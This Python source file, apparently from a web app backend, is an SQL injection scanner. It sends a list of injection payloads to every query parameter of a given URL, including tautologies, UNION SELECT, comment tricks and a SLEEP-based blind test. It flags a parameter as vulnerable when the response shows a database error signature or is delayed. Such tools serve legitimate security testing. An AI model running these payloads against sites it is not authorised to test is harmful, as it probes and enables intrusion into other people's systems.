# backend/app/utils/sql_injection.py
import requests
import time
from urllib.parse import urlparse, parse_qs
import logging
from bs4 import BeautifulSoup

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# SQL Payloads and Error Signatures (unchanged from your code)
ADVANCED_SQL_PAYLOADS = [
    "' OR '1'='1", "' OR 1=1 --", "' OR 'a'='a", "admin'--", 
    "' UNION SELECT 1,2,3 --", "' AND 'x'='x", "' AND SLEEP(5) --", 
    "' AND 1=CAST(CHAR(97)+CHAR(98)+CHAR(99) AS NVARCHAR(4000)) --", 
    "admin' #", "' ORDER BY 1--", "' OR 'x'='x'/*"
]

TIME_BASED_SQL_PAYLOAD = "' OR IF(1=1, SLEEP(5), 0) --"

ERROR_SIGNATURES = [
    "sql syntax", "mysql", "syntax error", "unclosed quotation mark", 
    "odbc microsoft access", "warning: mysql", "quoted string not properly terminated", 
    "mariaDB", "pg_query", "psql:", "error in your SQL syntax"
]

def check_sql_injection(url, extra_params=None, max_tests=10):
    results = {
        "action": "check_sql",
        "url": url,
        "vulnerable_params": [],
        "time_based_test": None
    }
    
    parsed = urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    original_params = parse_qs(parsed.query)
    
    if extra_params:
        for k, v in extra_params.items():
            original_params[k] = [v]
    
    if not original_params:
        original_params = {"id": ["1"]}

    for param, values in list(original_params.items()):
        original_value = values[0]
        tested_count = 0
        
        for payload in ADVANCED_SQL_PAYLOADS:
            if tested_count >= max_tests:
                break
            
            test_params = original_params.copy()
            test_params[param] = [payload]
            
            try:
                r = requests.get(base_url, params=test_params, timeout=5)
                combined_text = r.text.lower()
                if any(err_sig in combined_text for err_sig in ERROR_SIGNATURES):
                    results["vulnerable_params"].append({
                        "param": param,
                        "payload": payload,
                        "vulnerable": True,
                        "evidence": "SQL error signature found in response"
                    })
                else:
                    results["vulnerable_params"].append({
                        "param": param,
                        "payload": payload,
                        "vulnerable": False
                    })
            except requests.RequestException as e:
                logger.warning(f"Request failed for {url} with payload {payload}: {e}")
            
            tested_count += 1

    first_param = next(iter(original_params))
    test_params = original_params.copy()
    test_params[first_param] = [TIME_BASED_SQL_PAYLOAD]
    
    try:
        start_time = time.time()
        requests.get(base_url, params=test_params, timeout=10)
        end_time = time.time()
        
        if end_time - start_time > 4:
            results["time_based_test"] = {
                "payload": TIME_BASED_SQL_PAYLOAD,
                "vulnerable": True,
                "evidence": "Significant response delay (possible blind SQL injection)"
            }
        else:
            results["time_based_test"] = {
                "payload": TIME_BASED_SQL_PAYLOAD,
                "vulnerable": False
            }
    except requests.RequestException as e:
        results["time_based_test"] = {
            "payload": TIME_BASED_SQL_PAYLOAD,
            "vulnerable": False,
            "note": f"RequestException encountered: {str(e)}"
        }
    
    logger.info(f"SQL Injection scan completed for {url}")
    return results